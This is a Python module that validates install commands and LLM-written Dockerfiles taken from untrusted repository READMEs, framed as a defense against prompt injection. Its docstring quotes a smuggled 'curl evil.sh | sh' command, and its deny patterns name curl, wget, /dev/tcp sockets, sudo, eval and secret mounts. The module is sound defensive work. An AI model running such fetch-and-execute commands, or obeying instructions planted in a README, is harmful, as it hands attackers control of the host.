"""Command validator — the prompt-injection defense.

Install commands are derived from an UNTRUSTED README (and later from an LLM
reading that README). A malicious repo can try to smuggle
`curl evil.sh | sh` into the command we execute. Docker limits the blast radius,
but the build step has network and runs arbitrary RUN lines — so every install
command passes this allowlist before it is ever executed.

Rules (docs/architecture.md):
  * allowed leading verb
  * no fetch-execute chaining (pipes, eval, command substitution)
  * no redirection or privilege escalation
  * must reference the repo being installed (local-only verbs exempt)
  * length + charset sanity
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# Leading verbs we permit. Longest-first so "pip3 install" wins over "pip".
ALLOWED_VERBS = (
    "go install", "go get",
    "pip3 install", "pip install", "pipx install",
    "npm install", "npm i",
    "cargo install",
    "docker build", "docker pull",
    "git clone",
    "make",
)

# Verbs that operate on an already-local checkout, so they can't be expected to
# name the repo.
LOCAL_VERBS = ("make",)

# Shell metacharacters that enable chaining/substitution/redirection.
FORBIDDEN_CHARS = {
    "|": "pipes",
    ";": "command chaining",
    "&": "backgrounding/chaining",
    ">": "output redirection",
    "<": "input redirection",
    "`": "command substitution",
    "\n": "newlines",
    "\r": "newlines",
}

FORBIDDEN_PATTERNS = (
    (re.compile(r"\$\("), "command substitution"),
    (re.compile(r"\$\{"), "variable expansion"),
    (re.compile(r"\beval\b", re.I), "eval"),
    (re.compile(r"\b(sudo|su|doas)\b", re.I), "privilege escalation"),
    (re.compile(r"\bcurl\b", re.I), "network fetch in an install command"),
    (re.compile(r"\bwget\b", re.I), "network fetch in an install command"),
    (re.compile(r"\bchmod\s+[0-7]*7[0-7]*\b"), "permission escalation"),
    (re.compile(r"/dev/tcp/"), "raw socket redirection"),
)

MAX_LEN = 400


@dataclass
class Result:
    ok: bool
    reason: str = ""

    def __bool__(self) -> bool:
        return self.ok


def _verb(cmd: str) -> str | None:
    low = cmd.lower()
    for verb in sorted(ALLOWED_VERBS, key=len, reverse=True):
        if low.startswith(verb):
            return verb
    return None


def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
    """Gate an install command before it is executed."""
    cmd = (cmd or "").strip()

    if not cmd:
        return Result(False, "empty install command")
    if len(cmd) > MAX_LEN:
        return Result(False, f"install command too long ({len(cmd)} > {MAX_LEN})")
    if any(ord(ch) < 32 for ch in cmd):
        return Result(False, "control characters in install command")

    verb = _verb(cmd)
    if verb is None:
        head = cmd.split()[0] if cmd.split() else cmd
        return Result(False, f"disallowed command; must start with one of "
                             f"{', '.join(ALLOWED_VERBS)} (got {head!r})")

    for ch, why in FORBIDDEN_CHARS.items():
        if ch in cmd:
            return Result(False, f"{why} not allowed in an install command")
    for pat, why in FORBIDDEN_PATTERNS:
        if pat.search(cmd):
            return Result(False, f"{why} not allowed in an install command")

    if verb not in LOCAL_VERBS and (owner or repo):
        low = cmd.lower()
        if (repo and repo.lower() in low) or (owner and owner.lower() in low):
            pass
        else:
            return Result(False, f"install command does not reference {owner}/{repo} — "
                                 "refusing to install from an unrelated source")

    return Result(True)


# Base images we allow an LLM-written Dockerfile to start FROM. Pinning to
# official images stops a repaired Dockerfile from pulling an arbitrary one.
ALLOWED_BASES = ("golang", "python", "node", "rust", "alpine", "debian", "ubuntu",
                 "busybox", "gcr.io/distroless/")

# Fetch-execute and secret-exfiltration patterns inside RUN lines.
DOCKERFILE_BAD = (
    (re.compile(r"(curl|wget)[^\n|]*\|\s*(ba)?sh", re.I), "piping a download into a shell"),
    (re.compile(r"^\s*ADD\s+https?://", re.I | re.M), "ADD from a URL"),
    (re.compile(r"--mount=type=(secret|ssh)", re.I), "secret/ssh mount"),
    (re.compile(r"/dev/tcp/"), "raw socket redirection"),
    (re.compile(r"^\s*(COPY|ADD)\s+(?!--from=)", re.I | re.M), "COPY/ADD from a build "
     "context (there is none — clone inside a RUN instead)"),
)

MAX_DOCKERFILE_LINES = 60


def validate_dockerfile(text: str) -> Result:
    """Gate an LLM-written Dockerfile before it is built."""
    df = (text or "").strip()
    if not df:
        return Result(False, "empty Dockerfile")
    lines = [l for l in df.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        return Result(False, "Dockerfile has no instructions")
    if len(lines) > MAX_DOCKERFILE_LINES:
        return Result(False, f"Dockerfile too long ({len(lines)} instructions)")

    first = lines[0].strip()
    if not first.upper().startswith("FROM "):
        return Result(False, f"Dockerfile must start with FROM (got {first[:40]!r})")

    for line in lines:
        if line.strip().upper().startswith("FROM "):
            image = line.split(None, 1)[1].strip().split(" AS ")[0].strip().lower()
            if not image.startswith(ALLOWED_BASES):
                return Result(False, f"base image {image!r} is not an allowed official image")

    for pat, why in DOCKERFILE_BAD:
        if pat.search(df):
            return Result(False, f"{why} not allowed in a Dockerfile")

    return Result(True)


def validate_command(command: str) -> Result:
    """Gate a free-form run command you typed.

    This is a usability guard more than a security one — the command runs as argv
    inside the tool's container with no shell, so shell syntax wouldn't do what
    you expect (a pipe would become a literal argument). Better to say so than to
    silently misbehave.
    """
    t = (command or "").strip()
    if not t:
        return Result(False, "empty command")
    if len(t) > MAX_LEN:
        return Result(False, f"command too long (>{MAX_LEN} chars)")
    if any(ord(ch) < 32 for ch in t):
        return Result(False, "control characters in command")
    for ch, why in FORBIDDEN_CHARS.items():
        if ch in t:
            return Result(False, f"{why} won't work here — the command runs "
                                 "directly in the container with no shell")
    for pat, why in FORBIDDEN_PATTERNS:
        if pat.search(t):
            return Result(False, f"{why} won't work here — no shell is involved")
    return Result(True)


# The extracted hint is validated the same way (its {{target}} placeholder is
# harmless to these checks).
validate_run = validate_command
